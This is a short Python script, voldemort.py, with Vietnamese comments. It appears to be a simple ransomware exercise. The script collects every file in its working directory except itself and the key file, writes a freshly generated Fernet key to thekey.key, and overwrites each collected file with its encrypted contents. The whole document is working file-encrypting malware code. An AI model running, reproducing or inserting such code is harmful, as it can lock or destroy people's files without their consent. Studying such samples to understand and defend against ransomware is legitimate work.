
// file này viết voldemort.py
import os
from cryptography.fernet import Fernet 

files = []

for file in os.listdir():
    if file == "voldemort.py" or file == "thekey.key": 
    # nếu file có "voldemort.py" hay thekey.key --> tiếp tục
        continue 
    if os.path.isfile(file):
        files.append(file)

print(files)

# KEY mã hóa
key = Fernet.generate_key()

# đẩy KEY vào thekey.key
with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as the_file: # Mở FILE
        contents = the_file.read() # ĐỌC file
    contents_encrypted = Fernet(key).encrypt(contents) # Mã Hóa lại tất cả các FILE
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted) # ghi lại các file
